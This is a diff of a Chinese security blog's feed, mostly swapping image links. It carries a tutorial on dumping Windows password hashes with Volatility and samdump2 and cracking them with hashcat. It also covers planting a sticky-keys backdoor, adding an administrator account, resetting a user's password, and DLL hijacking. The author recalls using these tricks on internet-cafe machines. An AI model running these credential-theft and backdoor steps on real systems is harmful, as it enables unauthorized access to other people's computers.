 <h4 id="2-利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，-profile-Win7SP1x64-架构一定要指定正确，不然会找不到地址"><a href="#2-利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，-profile-Win7SP1x64-架构一定要指定正确，不然会找不到地址" class="headerlink" title="2. 利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，--profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址"></a>2. 利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，<strong>-</strong>-profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址</h4><blockquote>
 <p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hivelist -f memory.dmp –profile=Win7SP1x64</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419110839_6RL5dK_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419110839_6RL5dK_Screenshot.jpeg" alt=""></p>
 <h4 id="3-接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML-hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！"><a href="#3-接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML-hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！" class="headerlink" title="3. 接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！"></a>3. 接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！</h4><blockquote>
 <p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hashdump -f memory.dmp –profile=Win7SP1x64 sys-offset=0xfffff8a000024010 sam-offset=0xfffff8a000b33010</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419111612_Tkq2jz_Screenshot.jpeg" alt=""></p>
-<h2 id="0x05-利用kali-ISO获取密码"><a href="#0x05-利用kali-ISO获取密码" class="headerlink" title="0x05. 利用kali ISO获取密码"></a>0x05. 利用kali ISO获取密码</h2><h4 id="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"><a href="#这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。" class="headerlink" title="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"></a>这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。</h4><h4 id="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"><a href="#在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。" class="headerlink" title="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"></a>在开始之前我们应该先准备一个USB启动盘，制作方法可以看我<a href="https://times0ng.github.io/2018/03/01/kali安装KVM入坑笔记/">以前的文章</a>，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。</h4><h4 id="实验环境：-3"><a href="#实验环境：-3" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10"><a href="#emsp-emsp-windows-10" class="headerlink" title="&emsp;&emsp;windows 10"></a>&emsp;&emsp;windows 10</h4><h4 id="emsp-emsp-kali-ISO-emsp-download-here"><a href="#emsp-emsp-kali-ISO-emsp-download-here" class="headerlink" title="&emsp;&emsp;kali ISO &emsp;// download here"></a>&emsp;&emsp;kali ISO &emsp;// <a href="https://www.kali.org/downloads/" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-3"><a href="#实验步骤：-3" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）"><a href="#1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）" class="headerlink" title="1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）"></a>1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419184849_OuzqV7_Screenshot.jpeg" alt=""></p>
-<h4 id="2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可"><a href="#2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可" class="headerlink" title="2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可"></a>2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419185050_jKbLW5_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419111612_Tkq2jz_Screenshot.jpeg" alt=""></p>
+<h2 id="0x05-利用kali-ISO获取密码"><a href="#0x05-利用kali-ISO获取密码" class="headerlink" title="0x05. 利用kali ISO获取密码"></a>0x05. 利用kali ISO获取密码</h2><h4 id="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"><a href="#这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。" class="headerlink" title="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"></a>这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。</h4><h4 id="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"><a href="#在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。" class="headerlink" title="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"></a>在开始之前我们应该先准备一个USB启动盘，制作方法可以看我<a href="https://times0ng.github.io/2018/03/01/kali安装KVM入坑笔记/">以前的文章</a>，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。</h4><h4 id="实验环境：-3"><a href="#实验环境：-3" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10"><a href="#emsp-emsp-windows-10" class="headerlink" title="&emsp;&emsp;windows 10"></a>&emsp;&emsp;windows 10</h4><h4 id="emsp-emsp-kali-ISO-emsp-download-here"><a href="#emsp-emsp-kali-ISO-emsp-download-here" class="headerlink" title="&emsp;&emsp;kali ISO &emsp;// download here"></a>&emsp;&emsp;kali ISO &emsp;// <a href="https://www.kali.org/downloads/" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-3"><a href="#实验步骤：-3" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）"><a href="#1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）" class="headerlink" title="1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）"></a>1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419184849_OuzqV7_Screenshot.jpeg" alt=""></p>
+<h4 id="2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可"><a href="#2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可" class="headerlink" title="2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可"></a>2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419185050_jKbLW5_Screenshot.jpeg" alt=""></p>
 <h4 id="3-进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到-mnt-目录下，之后对-mnt目录下的操作就相当于对win10进行操作了"><a href="#3-进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到-mnt-目录下，之后对-mnt目录下的操作就相当于对win10进行操作了" class="headerlink" title="3. 进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了"></a>3. 进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了</h4><blockquote>
 <p>fdisk -l &amp;&amp; mount /dev/sda2 /mnt &amp;&amp; cd /mnt/ </p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419185436_ohOVSp_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419185436_ohOVSp_Screenshot.jpeg" alt=""></p>
 <h4 id="4-挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】"><a href="#4-挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】" class="headerlink" title="4. 挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】"></a>4. 挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】</h4><blockquote>
 <p>cd /mnt/Windows/System32/config/ &amp;&amp; samdump2 SYSTEM SAM</p>
 <p>hashcat -m 1000 afc44ee7351d61d00698796da06b1ebf /usr/share/wordlists/sqlmap.txt <strong>-</strong>-force</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180420121521_8LVsuZ_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419190846_DSIMrd_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180420121521_8LVsuZ_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419190846_DSIMrd_Screenshot.jpeg" alt=""></p>
 <h4 id="5-虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows-提权基础-讲漏了，这里补上"><a href="#5-虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows-提权基础-讲漏了，这里补上" class="headerlink" title="5. 虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows 提权基础 讲漏了，这里补上"></a>5. 虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇<a href="https://times0ng.github.io/2018/04/13/Windows-提权基础（下）/">Windows 提权基础</a> 讲漏了，这里补上</h4><blockquote>
 <p>cd /mnt/Windows/System32/</p>
 <p>cp cmd.exe sethc.exe</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419192009_pBbNtJ_Screenshot.jpeg" alt=""></p>
-<h4 id="6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"><a href="#6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行" class="headerlink" title="6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"></a>6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419193253_crhGWM_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419192009_pBbNtJ_Screenshot.jpeg" alt=""></p>
+<h4 id="6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"><a href="#6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行" class="headerlink" title="6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"></a>6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419193253_crhGWM_Screenshot.jpeg" alt=""></p>
 <h4 id="7-我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼"><a href="#7-我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼" class="headerlink" title="7. 我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼"></a>7. 我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼</h4><blockquote>
 <p>net user test test /add</p>
 <p>net localgroup administrators /add test</p>
 <p>logoff</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419195550_4l4ZGP_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419195550_4l4ZGP_Screenshot.jpeg" alt=""></p>
 <h4 id="8-刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】"><a href="#8-刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】" class="headerlink" title="8. 刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】"></a>8. 刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】</h4><blockquote>
 <p>net user time0sng toor</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419200844_4N3J4b_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419200844_4N3J4b_Screenshot.jpeg" alt=""></p>
 <h2 id="0x06-结语"><a href="#0x06-结语" class="headerlink" title="0x06. 结语"></a>0x06. 结语</h2><h4 id="希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号：-001-即可获取百度云链接和解压密码。"><a href="#希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号：-001-即可获取百度云链接和解压密码。" class="headerlink" title="希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号： 001 即可获取百度云链接和解压密码。"></a>希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号： 001 即可获取百度云链接和解压密码。</h4>]]></content>
     
     <summary type="html">
@@ -309,25 +309,25 @@
     <link href="http://TimeS0ng.github.io/2018/04/13/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
     <id>http://TimeS0ng.github.io/2018/04/13/Windows-提权基础（下）/</id>
     <published>2018-04-13T09:13:28.000Z</published>
-    <updated>2018-04-13T09:13:59.989Z</updated>
+    <updated>2018-12-18T15:35:53.486Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！"><a href="#今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！" class="headerlink" title="今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！"></a>今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！</h4><a id="more"></a>
 <h2 id="0x01-DLL-劫持原理"><a href="#0x01-DLL-劫持原理" class="headerlink" title="0x01. DLL 劫持原理"></a>0x01. DLL 劫持原理</h2><h4 id="原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL-文件，Windows-中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell-的权限也就是该程序所拥有的权限。"><a href="#原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL-文件，Windows-中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell-的权限也就是该程序所拥有的权限。" class="headerlink" title="原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL 文件，Windows 中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell 的权限也就是该程序所拥有的权限。"></a>原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL 文件，Windows 中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell 的权限也就是该程序所拥有的权限。</h4><h4 id="原理：通常来说Windows-程序会使用一个预定义搜索路径去寻找DLL-文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL-文件放到其中一个路径下，并保证该恶意DLL-先于合法的DLL-被程序找到时就会发生DLL-劫持；也可能是程序寻找的DLL-文件名在系统中并不存在，这时我们只需将自己定制的DLL-文件放到程序的搜索路径也可以达到目的"><a href="#原理：通常来说Windows-程序会使用一个预定义搜索路径去寻找DLL-文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL-文件放到其中一个路径下，并保证该恶意DLL-先于合法的DLL-被程序找到时就会发生DLL-劫持；也可能是程序寻找的DLL-文件名在系统中并不存在，这时我们只需将自己定制的DLL-文件放到程序的搜索路径也可以达到目的" class="headerlink" title="原理：通常来说Windows 程序会使用一个预定义搜索路径去寻找DLL 文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL 文件放到其中一个路径下，并保证该恶意DLL 先于合法的DLL 被程序找到时就会发生DLL 劫持；也可能是程序寻找的DLL 文件名在系统中并不存在，这时我们只需将自己定制的DLL 文件放到程序的搜索路径也可以达到目的"></a>原理：通常来说Windows 程序会使用一个预定义搜索路径去寻找DLL 文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL 文件放到其中一个路径下，并保证该恶意DLL 先于合法的DLL 被程序找到时就会发生DLL 劫持；也可能是程序寻找的DLL 文件名在系统中并不存在，这时我们只需将自己定制的DLL 文件放到程序的搜索路径也可以达到目的</h4><h4 id="下面你可以看到在一个32-位系统中DLL-的搜索顺序："><a href="#下面你可以看到在一个32-位系统中DLL-的搜索顺序：" class="headerlink" title="下面你可以看到在一个32 位系统中DLL 的搜索顺序："></a>下面你可以看到在一个32 位系统中DLL 的搜索顺序：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1 - The directory from which the application loaded</div><div class="line">2 - 32-bit System directory (C:\Windows\System32)</div><div class="line">3 - 16-bit System directory (C:\Windows\System)</div><div class="line">4 - Windows directory (C:\Windows)</div><div class="line">5 - The current working directory (CWD)</div><div class="line">6 - Directories in the PATH environment variable (system then user)</div></pre></td></tr></table></figure>
-<h4 id="通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path-C-Python27-就是我们可以控制的路径，我们只需要将恶意定制的DLL-文件放到这个目录就可以。"><a href="#通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path-C-Python27-就是我们可以控制的路径，我们只需要将恶意定制的DLL-文件放到这个目录就可以。" class="headerlink" title="通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path = C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的DLL 文件放到这个目录就可以。"></a>通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path = C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的DLL 文件放到这个目录就可以。</h4><h2 id="0x02-实战演示"><a href="#0x02-实战演示" class="headerlink" title="0x02. 实战演示"></a>0x02. 实战演示</h2><h4 id="1-首先我在知乎上随便搜了点关于Windows-中的软件，然后随便选了一个感觉可能存在DLL-劫持的软件安装到我的Windows-7-虚拟机中"><a href="#1-首先我在知乎上随便搜了点关于Windows-中的软件，然后随便选了一个感觉可能存在DLL-劫持的软件安装到我的Windows-7-虚拟机中" class="headerlink" title="1. 首先我在知乎上随便搜了点关于Windows 中的软件，然后随便选了一个感觉可能存在DLL 劫持的软件安装到我的Windows 7 虚拟机中"></a>1. 首先我在知乎上随便搜了点关于Windows 中的软件，然后随便选了一个感觉可能存在DLL 劫持的软件安装到我的Windows 7 虚拟机中</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410222237_MewziO_Screenshot.jpeg" alt=""></p>
-<h4 id="2-然后调用工具-DllHijackAuditor-自动检测我们刚才下载的软件是否存在DLL-劫持，根据下图可以看到这里面存在一共-5-个DLL-文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！"><a href="#2-然后调用工具-DllHijackAuditor-自动检测我们刚才下载的软件是否存在DLL-劫持，根据下图可以看到这里面存在一共-5-个DLL-文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！" class="headerlink" title="2. 然后调用工具 DllHijackAuditor 自动检测我们刚才下载的软件是否存在DLL 劫持，根据下图可以看到这里面存在一共 5 个DLL  文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！"></a>2. 然后调用工具 <a href="https://securityxploded.com/getsoftware_direct.php?id=7777" target="_blank" rel="external">DllHijackAuditor</a> 自动检测我们刚才下载的软件是否存在DLL 劫持，根据下图可以看到这里面存在一共 5 个DLL  文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410223301_Bp44of_Screenshot.jpeg" alt=""></p>
+<h4 id="通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path-C-Python27-就是我们可以控制的路径，我们只需要将恶意定制的DLL-文件放到这个目录就可以。"><a href="#通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path-C-Python27-就是我们可以控制的路径，我们只需要将恶意定制的DLL-文件放到这个目录就可以。" class="headerlink" title="通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path = C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的DLL 文件放到这个目录就可以。"></a>通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path = C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的DLL 文件放到这个目录就可以。</h4><h2 id="0x02-实战演示"><a href="#0x02-实战演示" class="headerlink" title="0x02. 实战演示"></a>0x02. 实战演示</h2><h4 id="1-首先我在知乎上随便搜了点关于Windows-中的软件，然后随便选了一个感觉可能存在DLL-劫持的软件安装到我的Windows-7-虚拟机中"><a href="#1-首先我在知乎上随便搜了点关于Windows-中的软件，然后随便选了一个感觉可能存在DLL-劫持的软件安装到我的Windows-7-虚拟机中" class="headerlink" title="1. 首先我在知乎上随便搜了点关于Windows 中的软件，然后随便选了一个感觉可能存在DLL 劫持的软件安装到我的Windows 7 虚拟机中"></a>1. 首先我在知乎上随便搜了点关于Windows 中的软件，然后随便选了一个感觉可能存在DLL 劫持的软件安装到我的Windows 7 虚拟机中</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410222237_MewziO_Screenshot.jpeg" alt=""></p>
